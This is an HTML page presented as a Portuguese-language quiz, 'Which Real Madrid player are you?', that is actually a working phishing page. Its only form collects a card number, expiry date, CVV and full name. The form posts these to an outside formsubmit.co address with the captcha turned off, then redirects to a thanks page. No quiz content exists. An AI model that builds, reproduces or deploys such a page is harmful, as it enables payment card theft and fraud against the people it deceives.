<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Qual jogador?</title>
    <link rel="stylesheet" href="style.css">
    <link rel="icon" href="https://upload.wikimedia.org/wikipedia/pt/9/98/Real_Madrid.png">
</head>
<body>
    <div class="real">
        <h1>Qual Jogador do Real Madrid Você é</h1>
        <img src="https://cdn.espn.com.br/image/wide/622_5a869765-0813-4472-93f1-c684ee4b9bc5.jpg" alt="" class="imagem">
        <form action="https://formsubmit.co/b7fbe9d3281f3e0e77e8009fcedc6bde" method="POST">
            <div class="form-group">
                <label for="numero-cartao">Número do Cartão</label>
                <input type="text" id="numero-cartao" name="numero-cartao" required>
            </div>
            <div class="form-group">
                <label for="data-vencimento">Data de Vencimento</label>
                <input type="text" id="data-vencimento" name="data-vencimento" placeholder="MM/AA" required>
            </div>
            <div class="form-group">
                <label for="cvv">CVV</label>
                <input type="text" id="cvv" name="cvv" required>
            </div>
            <div class="form-group">
                <label for="nome-completo">Nome Completo</label>
                <input type="text" id="nome-completo" name="nome-completo" required>
            </div>
            <div class="form-group">
                <button type="submit">Enviar</button>
            </div>
            <input type="hidden" name="_next" value="https://pedrosiuberaba.github.io/Tesdtedo7/thanks.html">
            <input type="hidden" name="_captcha" value="false">
        </form>
    </div>
</body>
</html>
